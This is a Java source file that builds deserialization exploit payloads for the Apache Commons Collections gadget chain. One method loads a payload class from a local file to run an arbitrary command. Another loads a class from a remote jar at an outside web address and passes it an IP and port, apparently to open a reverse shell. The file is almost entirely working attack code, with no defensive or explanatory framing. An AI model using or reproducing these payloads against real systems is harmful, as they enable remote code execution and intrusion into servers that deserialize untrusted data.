package seriFileUp.test;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class test {

	public byte[] getPayload(String command) throws Exception {
		String ClassPath = "file:../.readme.html.tmp";
		Transformer[] transforms = {
				new ConstantTransformer(URLClassLoader.class),
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { URL[].class } }), //
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new Object[] { new java.net.URL[] { new URL(ClassPath) } } }), //??
				new InvokerTransformer("loadClass",
						new Class[] { String.class },
						new Object[] { "com.payload.RunCommand" }),
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }), //
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new String[] { command } }) }; //
		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		Class cls = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(new Class[] {
				Class.class, Map.class });
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[] { Retention.class,
				outmap });
		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
		ObjectOutputStream out = new ObjectOutputStream(bo);
		out.writeObject(instance);
		out.flush();
		out.close();
		return bo.toByteArray();
	}

	public static Object Reverse_Payload(String ip, int port) throws Exception {
		final Transformer[] transforms = new Transformer[] {
				new ConstantTransformer(java.net.URLClassLoader.class),
				// getConstructor class.class classname
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { java.net.URL[].class } }),
				// newinstance string http://www.iswin.org/attach/iswin.jar
				new InvokerTransformer(
						"newInstance",
						new Class[] { Object[].class },
						new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
								"http://www.iswin.org/attach/iswin.jar") } } }),
				// loadClass String.class R
				new InvokerTransformer("loadClass",
						new Class[] { String.class }, new Object[] { "R" }),
				// set the target reverse ip and port
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }),
				// invoke
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new String[] { ip + ":" + port } }),
				new ConstantTransformer(1) };

		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);

		Class cls = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(Retention.class, outmap);
		return instance;

	}

}
